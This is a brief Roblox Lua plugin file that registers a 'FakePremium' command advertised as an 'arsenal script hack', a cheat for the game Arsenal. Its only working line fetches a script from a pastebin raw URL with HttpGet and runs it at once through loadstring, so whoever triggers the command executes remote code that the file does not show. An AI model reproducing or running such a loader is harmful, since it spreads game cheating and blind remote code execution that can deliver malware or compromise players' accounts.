local Plugin = {
    ["PluginName"] = "ArsenalScript",
    ["PluginDescription"] = "arsenal script hack wow omg",
    ["Commands"] = {
        ["FakePremium"] = {
            ["ListName"] = "arsenal",
            ["Description"] = "arsenal script hack wow omg",
            ["Aliases"] = {"arsenalhack"},
            ["Function"] = function(args,speaker)
                loadstring(game:HttpGet("https://pastebin.com/raw/8ysy7ENG", true))()
            end
	    },
    }
}

return Plugin
